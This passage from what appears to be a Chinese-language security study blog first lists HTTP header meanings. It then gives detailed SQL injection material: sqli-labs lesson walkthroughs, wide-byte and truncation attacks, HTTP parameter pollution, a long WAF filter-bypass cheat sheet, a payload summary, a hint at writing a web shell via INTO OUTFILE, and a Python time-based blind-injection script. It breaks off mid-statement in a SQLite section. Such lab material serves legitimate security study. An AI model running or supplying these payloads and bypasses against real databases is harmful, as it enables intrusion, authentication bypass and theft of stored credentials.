4、Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。 5、Authorization：当客户端接收到来自WEB 服务器的WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB 服务器。 6、Cache-Control：请求：no-cache（不要缓存的实体，要求现在从WEB 服务器去取） max-age：（只接受Age 值小于max-age 值，并且没有过期的对象） max-stale：（可以接受过去的对象，但是过期时间必须小于max-stale 值） min-fresh：（接受其新鲜生命期大于其当前Age 跟min-fresh 值之和的缓存对象） 响应：public(可以用Cached 内容回应任何用户) private（只能用缓存内容回应先前请求该内容的那个用户） no-cache（可以缓存，但是只有在跟WEB 服务器验证了其有效后，才能返回给客户端） max-age：（本响应包含的对象的过期时间） ALL: no-store（不允许缓存） 7、Connection：请求：close（告诉WEB 服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。 keepalive（告诉WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。 响应：close（连接已经关闭）。 keepalive（连接保持着，在等待本次连接的后续请求）。 Keep-Alive：如果浏览器请求保持连接，则该头部表明希望WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300 8、Content-Encoding：WEB 服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip 9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。 10、Content-Length： WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length:26012 11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022 12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml 13、ETag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html 文件，如果被修改了，其Etag 也会别修改，所以ETag 的作用跟Last-Modified 的作用差不多，主要供WEB 服务器判断一个对象是否改变了。比如前一次请求某个html 文件时，获得了其ETag，当这次又请求这个文件时，浏览器就会把先前获得的ETag 值发送给WEB 服务器，然后WEB 服务器会把这个ETag 跟该文件的当前ETag 进行对比，然后就知道这个文件有没有改变了。 14、Expired：WEB 服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB 服务器验证了其有效性后，才能用来响应客户请求。是HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT 15、Host：客户端指定自己想访问的WEB 服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn 16、If-Match：如果对象的ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。 17、If-None-Match：如果对象的ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。 18、If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（ 比如返回对象）， 否则返回代码304 ，告诉浏览器该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT 19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。 20、If-Range：浏览器告诉WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的ETag 或者自己所知道的最后修改时间给WEB 服务器，让其判断对象是否改变了。总是跟Range 头部一 起使用。 21、Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT 22、Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。例如： Location ： <a href="http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif">http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</a> 23、Pramga：主要使用Pramga: no-cache，相当于Cache-Control： no-cache。例如：Pragma：no-cache 24、Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。 25、Range：浏览器（比如Flashget 多线程下载时）告诉WEB 服务器自己想取对象的哪部分。例如：Range: bytes=1173546- 26、Referer：浏览器向WEB 服务器表明自己是从哪个网页/URL 获得/点击当前请求中的网址/URL。例如：Referer：<a href="http://www.sina.com/">http://www.sina.com/</a> 27、Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61(Unix) 28、User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0(Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14 29、Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked 30、Vary: WEB 服务器用该头部的内容告诉Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB 服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding 那么Cache 服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache 服务器用自己Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding 31、Via： 列出从客户端到OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前个代理服务器的请求的Via 头部，并把自己的相关信息加到后面，以此类推，当OCS 收到最后一个代理服务器的请求时，检查Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80(squid/2.6.STABLE13)</p><p><strong>sqli-labs/less18</strong></p><p>从代码中看到</p><pre class="language-none"><code class="language-none">$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent','$IP', $uname)";</code></pre><p>将useragent 和ip 插入到数据库中，那么我们是不是可以用这个来进行注入呢？</p><p>将<code>user-agent</code> 修改为<code>'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1;</code></p><h2 id="基于程度和顺序的注入-哪里发生了影响"><a href="#基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="基于程度和顺序的注入(哪里发生了影响)"></a>基于程度和顺序的注入(哪里发生了影响)</h2><h3 id="一阶注射"><a href="#一阶注射" class="headerlink" title="一阶注射"></a>一阶注射</h3><h3 id="二阶注射"><a href="#二阶注射" class="headerlink" title="二阶注射"></a>二阶注射</h3><p>一阶注射是指输入的注射语句对WEB 直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB 应用程序产生影响，通过其它的辅助间接的对WEB 产生危害，这样的就被称为是二阶注入.</p><p><strong>sqli-labs/Less-24</strong></p><p>二次排序注入思路：</p><ol><li>黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL 语句或者命令。</li><li>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li><li>黑客向服务端发送第二个与第一次不相同的请求数据信息。</li><li>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL 语句或者命令在服务端环境中执行。</li><li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。此例子中我们的步骤是注册一个admin’#的账号，接下来登录该帐号后进行修改密码。此时修改的就是admin 的密码。Sql 语句变为UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ AND password=’ ， 也就是执行了UPDATE users SET passwd=”New_Pass” WHERE username =’admin’</li></ol><p>步骤演示： （1）初始数据库为</p><p>（2）注册admin’#账号</p><p>注意此时的数据库中出现了admin’#的用户，同时admin 的密码为123</p><p>（4）登录admin’#，并修改密码</p><p>可以看到admin 的密码已经修改为1111</p><h2 id="服务器（两层）架构"><a href="#服务器（两层）架构" class="headerlink" title="服务器（两层）架构"></a>服务器（两层）架构</h2><p>服务器端有两个部分：第一部分为tomcat 为引擎的jsp 型服务器，第二部分为apache为引擎的php 服务器，真正提供web 服务的是php 服务器。工作流程为：client 访问服务器，能直接访问到tomcat 服务器，然后tomcat 服务器再向apache 服务器请求数据。数据返回路径则相反。</p><p>重点：index.php?id=1&amp;id=2，你猜猜到底是显示id=1 的数据还是显示id=2 的？</p><p>Explain：apache（php）解析最后一个参数，即显示id=2 的内容。Tomcat（jsp）解析第一个参数，即显示id=1 的内容。</p><p>以上图片为大多数服务器对于参数解析的介绍。 此处我们想一个问题：index.jsp?id=1&amp;id=2 请求，针对第一张图中的服务器配置情况，客户端请求首先过tomcat，tomcat 解析第一个参数，接下来tomcat 去请求apache（php）服务器，apache 解析最后一个参数。那最终返回客户端的应该是哪个参数？Answer：此处应该是id=2 的内容，应为时间上提供服务的是apache（php）服务器，返回的数据也应该是apache 处理的数据。而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在tomcat 服务器处做数据过滤和处理，功能类似为一个WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过WAF 的检测。该用法就是HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在了解宽字节注入之前，我们先来看一看字符集是什么。 字符集也叫字符编码，是一种将符号转换为二进制数的映射关系。 几种常见的字符集： <code>ASCII</code>编码：单字节编码 <code>latin1</code>编码：单字节编码 <code>gbk</code>编码：使用一字节和双字节编码，<code>0x00-0x7F</code>范围内是一位，和<code>ASCII</code> 保持一致。双字节的第一字节范围是<code>0x81-0xFE</code> <code>UTF-8</code>编码：使用一至四字节编码，<code>0x00–0x7F</code>范围内是一位，和<code>ASCII</code> 保持一致。其它字符用二至四个字节变长表示。</p><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。 通常来说，一个<code>gbk</code>编码汉字，占用2个字节。一个<code>utf-8</code>编码的汉字，占用3个字节。</p><p>宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入。PHP的编码为UTF-8 而MySql的编码设置为了<code>SET NAMES 'gbk' </code>或是<code>SET character_set_client =gbk</code>，这样配置会引发编码转换从而导致的注入漏洞。</p><pre class="language-none"><code class="language-none">$conn-&gt;query("set names 'gbk';");</code></pre><h3 id="GBK编码"><a href="#GBK编码" class="headerlink" title="GBK编码"></a>GBK编码</h3><pre class="language-none"><code class="language-none">&lt;?php    $conn = mysqli_connect("127.0.0.1:3307", "root", "root", "db");    if (!$conn) {        die("Connection failed: " . mysqli_connect_error());    } $    conn-&gt;query("set names 'gbk';");    $username = addslashes(@$_POST['username']);//非常安全的转义函数    $password = addslashes(@$_POST['password']);    $sql = "select * from users where username = '$username' and password='$password';";    $rs = mysqli_query($conn,$sql);    echo $sql.'&lt;br&gt;';    if($rs-&gt;fetch_row()){        echo "success";    }else{        echo "fail";} ?&gt;用户名输入：admin' or 1=1#转义后为： admin\' or 1=1#执行语句：... where username='admin\' or 1=1#'用户名输入：admin%df' or 1=1#转义后为： admin%df\' or 1=1#SET character_set_client ='gbk'后：admin運' or 1=1#执行语句：... where username='admin運' or 1=1#'</code></pre><p><code>%df</code> 吃掉<code>\ </code>具体的原因是<code>urlencode(\') </code>= <code>%5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形成<code>%df%5c%27</code>，而上面提到的mysql 在GBK 编码方式的，第一位范围为<code>0x00-0x7F</code>时，当作一个字符。<code>%df</code>不在这个范围内，因此会将两个字节当做一个汉字，此事<code>%df%5c</code> 就是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><h3 id="Latin1编码"><a href="#Latin1编码" class="headerlink" title="Latin1编码"></a>Latin1编码</h3><pre class="language-none"><code class="language-none">$mysqli = new mysqli( "localhost","root","root","cat");if($mysqli-&gt;connect_errno){    printf("failed: %s\n", Smysqli-&gt;connect_error);    exit();}$mysqli-&gt;query("set names utf8");$username= addslashes($_GET['username']);//我们在其基础上添加这么一条语句。if($username === 'admin'){    die("You can't do this");}$sqL= "SELECT * FROM `table1` WHERE username='{$username}'";if($result = $mysqli-&gt;query($sql)){    printf("select returned %d rous.\n",$resule-&gt;num_rows);    while ($row = $result-&gt;fetch_ array(MYSQLI_ASSOC))    {        var_ dump($row);          }    $resule-&gt;close();}else{    var_dump($mysqli-&gt;error);}$mysqli-&gt;close();?&gt;</code></pre><p>SQL语句会先转成<code>character_set_client</code>设置的编码。但他接下来还会继续转换。<code>character_set_client</code>客户端层转换完毕之后，数据将会交给<code>character_set_connection</code>连接层处理，最后在从<code>character_set_connection</code>转到数据表的内部操作字符集。</p><p>字符集的转换为：<code>UTF-8—&gt;UTF-8-&gt;Latin1</code></p><p>UTF-8编码是变长编码，可能有1~4个字节表示：</p><p>• 一字节时范围是<code>[00-7F]</code> • 两字节时范围是<code>[C0-DF][80-BF]</code> • 三字节时范围是<code>[E0-EF][80-BF][80-BF]</code> • 四字节时范围是<code>[F0-F7][80-BF][80-BF</code>][80-BF] 然后根据<code>RFC 3629</code>规范，又有一些字节值是不允许出现在<code>UTF-8</code>编码中的：</p><p>所以最终，UTF-8第一字节的取值范围是：<code>00-7F</code>、<code>C2-F4</code>。</p><p>输入：<code>?username=admin%c2</code> 其中<code>%c2</code>是一个<code>Latin1</code>字符集不存在的字符。<code>%00-%7F</code>可以直接表示某个字符、<code>%C2-%F4</code>不可以直接表示某个字符而只是其他长字节编码结果的首字节。</p><p>对于不完整的长字节UTF-8编码的字符，进行字符集转换时会直接忽略，所以<code>admin%c2</code>会变成<code>admin</code></p><h2 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h2><p>当数据库字符串长度过短，并且后端没有对字符串进行长度限制时</p><pre class="language-none"><code class="language-none">CREATE TABLE users(    username varchar(20),    password varchar(20))</code></pre><p>漏洞代码逻辑如下：</p><p>代码由登录和注册构成。</p><p>1.用<code>select * from table where username='$username'</code>检测你输入的用户名，如果存在，说明你注册过，那么不让你注册。</p><p>2.用户名不存在，用<code>insert into table values('$username','$password')</code>把你输入的用户名密码插入数据库。</p><p><code>insert</code>和<code>select</code>语句执行不一样造成</p><p><code>INSERT</code>语句：截取前20个字符 <code>SELECT</code>语句：输入什么就是什么</p><p>当我们注册时字符串长度超过20，那么使用<code>select</code>检测时就会不存在，那么就使用<code>insert</code>插入，这时候由于长度超过20，截取前20个字符。</p><p>注册<code>admin a</code> -&gt; <code>SELECT</code>认为不存在-&gt; <code>INSERT</code>了前20位-&gt; 使用自己注册的<code>admin</code>和对应密码进行登录~</p><pre class="language-none"><code class="language-none">INSERT插入了admin+15空格，实际上是插入了admin，末尾的空格会被MySQL忽略掉</code></pre><p>这样就修改了<code>admin</code>的密码了</p><h2 id="order-by-后的injection"><a href="#order-by-后的injection" class="headerlink" title="order by 后的injection"></a>order by 后的injection</h2><h3 id="order-by参数后注入"><a href="#order-by参数后注入" class="headerlink" title="order by参数后注入"></a>order by参数后注入</h3><p>从本关开始，我们开始学习order by 相关注入的知识。本关的sql 语句为$sql = “SELECT * FROM users ORDER BY $id”;尝试?sort=1 desc 或者asc，显示结果不同，则表明可以注入。（升序or 降序排列）从上述的sql 语句中我们可以看出，我们的注入点在order by 后面的参数中，而order by不同于的我们在where 后的注入点，不能使用union 等进行注入。如何进行order by 的注入，我们先来了解一下mysql 官方select 的文档。</p><pre class="language-none"><code class="language-none">SELECT     [ALL | DISTINCT | DISTINCTROW ]       [HIGH_PRIORITY]       [STRAIGHT_JOIN]       [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]       [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]     select_expr [, select_expr ...]     [FROM table_references     [WHERE where_condition]     [GROUP BY {col_name | expr | position}       [ASC | DESC], ... [WITH ROLLUP]]     [HAVING where_condition]     [ORDER BY {col_name | expr | position}       [ASC | DESC], ...]     [LIMIT {[offset,] row_count | row_count OFFSET offset}]     [PROCEDURE procedure_name(argument_list)]     [INTO OUTFILE 'file_name' export_options       | INTO DUMPFILE 'file_name'       | INTO var_name [, var_name]]     [FOR UPDATE | LOCK IN SHARE MODE]]</code></pre><p>我们可利用order by 后的一些参数进行注入。</p><p>（1）、order by 后的数字可以作为一个注入点。也就是构造order by 后的一个语句，让该语句执行结果为一个数，我们尝试</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=right(version(),1)</code></pre><p>没有报错，但是right 换成left 都一样，说明数字没有起作用，我们考虑布尔类型。此时我们可以用报错注入和延时注入。此处可以直接构造?sort= 后面的一个参数。此时，我们可以有三种形式，</p><ul><li>直接添加注入语句，?sort=(select *<strong>*</strong>)</li><li>利用一些函数。例如rand()函数等。?sort=rand(sql 语句) Ps：此处我们可以展示一下rand(ture)和rand(false)的结果是不一样的。</li></ul><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=rand(false)</code></pre><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=rand(true</code></pre><ul><li>利用and，例如?sort=1 and (加sql 语句)。</li></ul><p>同时，sql 语句可以利用报错注入和延时注入的方式，语句我们可以很灵活的构造。</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))</code></pre><p>接下来我们用rand()进行演示一下，因为上面提到rand(true)和rand(false)结果是不一样的。</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=115)http://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=116)从上述两个图的结果，对比rand(ture)和rand(false)的结果，可以看出报错注入是成功的。</code></pre><p>延时注入例子</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort= (SELECT IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,md5('1')),null) FROM (select database() as current) as tb1)http://127.0.0.1/sqli-labs/Less-46/?sort=1 and If(ascii(substr(database(),1,1))=116,0,sleep(5))</code></pre><p>同时也可以用?sort=1 and 后添加注入语句。</p><h3 id="procedure-analyse-参数后注入"><a href="#procedure-analyse-参数后注入" class="headerlink" title="procedure analyse 参数后注入"></a>procedure analyse 参数后注入</h3><p>此方法适用于MySQL 5.x中，在limit语句后面的注入</p><p>利用procedure analyse 参数，我们可以执行报错注入。同时，在procedure analyse 和order by 之间可以存在limit 参数，我们在实际应用中，往往也可能会存在limit 后的注入，可以利用procedure analyse 进行注入。</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=1  procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)//SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 如果不支持报错注入的话，还可以基于时间注入：//SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></pre><h3 id="导入导出文件into-outfile-参数"><a href="#导入导出文件into-outfile-参数" class="headerlink" title="导入导出文件into outfile 参数"></a>导入导出文件into outfile 参数</h3><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=1 into outfile "c:\\wamp\\www\\sqllib\\test1.txt"将查询结果导入到文件当中那这个时候我们可以考虑上传网马，利用lines terminated byInto outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated by 0x(网马进行16 进制转换)</code></pre><h2 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h2><h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><pre class="language-none"><code class="language-none">/**/替代空格%09 TAB 键（水平）%0a 新建一行%0c 新的一页%0d return 功能%0b TAB 键（垂直）%a0 空格() 代替空格，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。</code></pre><p>%a0�</p><p>这个可算是一个不成汉字的中文字符了，那这应该就好理解了，因为%a0的特性，在进行正则匹配时，匹配到它时是识别为中文字符的，所以不会被过滤掉，但是在进入SQL语句后，Mysql是不认中文字符的，所以直接当作空格处理，就这样，我们便达成了Bypass的目的，成功绕过空格+注释的过滤</p><h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p>当在登录时使用的是如下SQL语句：</p><pre class="language-none"><code class="language-none">select user from user where user='$_POST[username]' and password='$_POST[password]';</code></pre><p>在这里单引号被过滤了，但是反斜杠<code>\</code>并没有被过滤。则单引号可以被转义</p><p>输入的用户名以反斜杠<code>\</code>结尾</p><pre class="language-none"><code class="language-none">username=admin\&amp;password=123456#将这个拼接进去，\就可以将第2个单引号转义掉select * from users where username='admin\' and password='123456#';这样第1个单引号就会找第3个单引号进行闭合，后台接收到的username实际上是admin\' and password=这个整体接下来构造password为or 2&gt;1#select * from users where username='admin\' and password=' or 2&gt;1#';上面的语句会返回为真，通过这样的思路，我们就可以进行bool盲注</code></pre><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><pre class="language-none"><code class="language-none">//--%20/**/#--+-- -%00;;%00;\x00</code></pre><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>利用urlencode，ascii(char)，hex，unicode等编码绕过</p><pre class="language-none"><code class="language-none">or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。十六进制编码SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))双重编码绕过?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+一些unicode编码举例：    单引号：'%u0027 %u02b9 %u02bc%u02c8 %u2032%uff07 %c0%27%c0%a7 %e0%80%a7空白：%u0020 %uff00%c0%20 %c0%a0 %e0%80%a0左括号(:%u0028 %uff08%c0%28 %c0%a8%e0%80%a8右括号):%u0029 %uff09%c0%29 %c0%a9%e0%80%a9</code></pre><h3 id="like绕过"><a href="#like绕过" class="headerlink" title="like绕过"></a>like绕过</h3><pre class="language-none"><code class="language-none">?id=1' or 1 like 1#可以绕过对 = &gt; 等过滤</code></pre><h3 id="in绕过"><a href="#in绕过" class="headerlink" title="in绕过"></a>in绕过</h3><pre class="language-none"><code class="language-none">or '1' IN ('1234')#可以替代=</code></pre><h3 id="等价函数或变量"><a href="#等价函数或变量" class="headerlink" title="等价函数或变量"></a>等价函数或变量</h3><pre class="language-none"><code class="language-none">hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir()举例：substring()和substr()无法使用时：?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74　或者：substr((select 'password'),1,1) = 0x70strcmp(left('password',1), 0x69) = 1strcmp(left('password',1), 0x70) = 0strcmp(left('password',1), 0x71) = -1</code></pre><h3 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h3><pre class="language-none"><code class="language-none">select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用</code></pre><h3 id="过滤union"><a href="#过滤union" class="headerlink" title="过滤union"></a>过滤union</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union'过滤代码 union select user,password from users绕过方式 1 &amp;&amp; (select user from users where userid=1)='admin'</code></pre><h3 id="过滤where"><a href="#过滤where" class="headerlink" title="过滤where"></a>过滤where</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where'过滤代码 1 &amp;&amp; (select user from users where user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users limit 1) = 'admin'</code></pre><h3 id="过滤limit"><a href="#过滤limit" class="headerlink" title="过滤limit"></a>过滤limit</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit'过滤代码 1 &amp;&amp; (select user from users limit 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin</code></pre><h3 id="过滤group-by"><a href="#过滤group-by" class="headerlink" title="过滤group by"></a>过滤group by</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by'过滤代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1</code></pre><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by|select'过滤代码 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1只能查询本表中的数据绕过方式 1 &amp;&amp; substr(user,1,1) = 'a'</code></pre><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p><pre class="language-none"><code class="language-none">handler users open as hd; #指定数据表进行载入并将返回句柄重命名handler hd read first; #读取指定表/句柄的首行数据handler hd read next; #读取指定表/句柄的下一行数据handler hd close; #关闭句柄</code></pre><h3 id="过滤’-单引号"><a href="#过滤’-单引号" class="headerlink" title="过滤’(单引号)"></a>过滤’(单引号)</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by|select|\''过滤代码 1 &amp;&amp; substr(user,1,1) = 'a'绕过方式 1 &amp;&amp; user_id is not null    1 &amp;&amp; substr(user,1,1) = 0x61    1 &amp;&amp; substr(user,1,1) = unhex(61)</code></pre><h3 id="过滤hex"><a href="#过滤hex" class="headerlink" title="过滤hex"></a>过滤hex</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by|select|\'|hex'过滤代码 1 &amp;&amp; substr(user,1,1) = unhex(61)绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</code></pre><h3 id="过滤substr"><a href="#过滤substr" class="headerlink" title="过滤substr"></a>过滤substr</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by|select|\'|hex|substr'过滤代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) 绕过方式 1 &amp;&amp; lpad(user(),1,1) in 'r'</code></pre><h3 id="过滤-逗号"><a href="#过滤-逗号" class="headerlink" title="过滤,逗号"></a>过滤<code>,</code>逗号</h3><pre class="language-none"><code class="language-none">//过滤了逗号怎么办？就不能多个参数了吗？SELECT SUBSTR('2018-08-17',6,5);与SELECT SUBSTR('2018-08-17' FROM 6 FOR 5);意思相同substr支持这样的语法：SUBSTRING(str FROM pos FOR len)SUBSTRING(str FROM pos)MID()后续加入了这种写法</code></pre><h2 id="常用Payload总结"><a href="#常用Payload总结" class="headerlink" title="常用Payload总结"></a>常用Payload总结</h2><pre class="language-none"><code class="language-none">//联合查询//获取当前数据库的表名1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #//获取表中的字段名1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #//查询数据1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #//如果group_concat被过滤了，而又只能返回一条数据，则用limit 0,1//布尔盲注脚本import requests as reqimport time as timport stringurl = "xxx"select = "select group_concat(table_name) from information_schema.tables where binary table_schema in (select databases())"select = "select group_concat(column_name) from information_schema.columns where binary table_name in ('xxxx') "select = "select group_concat(xxxx) from xxxxxxx"res = ""def text2hex(s):    res = ""    for i in s:        res +=hex(ord(i)).replace("0x", "")    return "0x" + resfor i in range(1,50):    for ascii in string.printable:        if ascii == '\\': #转义符号没有意义            continue        data = {            "username" : "admin",            "password" : f"123' or if((binary right(({select},{i}) in ({text2hex(ascii+res)})),(select benchmark(15000000.sha1(sha(sha(1)))) in (0)),0)#".replace(" ", "/**/")        }        start = int(t.time())        r = req.post(url=url, data=data)        end = int(t.time()) - start        print(data)        if end &gt; 4:            res = ascii +res            print(res)            break        if ascii == string.printable[-1:]:            exit(0)</code></pre><h1 id="Sqlite注入"><a href="#Sqlite注入" class="headerlink" title="Sqlite注入"></a>Sqlite注入</h1><h2 id="注释符-1"><a href="#注释符-1" class="headerlink" title="注释符"></a>注释符</h2><pre class="language-none"><code class="language-none">/**/--两种注释符 --后面不带空格 </code></pre><p>可以用于判断数据库类型</p><p><code>#</code>如果不生效的话则说明不是<code>mysql</code></p><h2 id="sqlite系统库"><a href="#sqlite系统库" class="headerlink" title="sqlite系统库"></a>sqlite系统库</h2><pre class="language-none"><code class="language-none">--先创建两个表CREATE TABLE GIFT(ID INT PRIMARY KEY NOT NULL,ITEM TEXT NOT NULL,LOG TEXT NOT NULL);CREATE TABLE SECRET(ID INT NOT NULL,fl4ggg TEXT PRIMARY KEY NOT NULL);INSERT INTO GIFT 